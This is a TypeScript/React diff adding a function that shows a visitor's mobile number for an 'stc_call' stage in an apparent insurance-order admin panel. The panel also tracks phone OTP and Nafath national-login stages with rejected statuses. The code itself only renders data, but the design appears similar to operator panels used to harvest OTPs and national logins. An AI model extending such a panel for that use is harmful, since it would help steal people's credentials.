@@ -370,6 +370,22 @@ function renderPhoneOtp(order: InsuranceOrder, stageEvents: StageEvent[]) {
   );
 }
 
+function renderStcCall(order: InsuranceOrder, stageEvents: StageEvent[]) {
+  const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "stc_call").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
+  const latest = events.at(-1);
+  const phone = order.phone || (latest?.payload as any)?.phone || null;
+
+  return (
+    <div className="space-y-1.5">
+      {phone ? (
+        <InfoItem label="رقم الجوال" value={phone} />
+      ) : (
+        <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
+      )}
+    </div>
+  );
+}
+
 function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], selectedVisitor: Visitor, visitorNationalId: string | null) {
   const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
   const rejected = events.filter(e => e.status === "rejected");
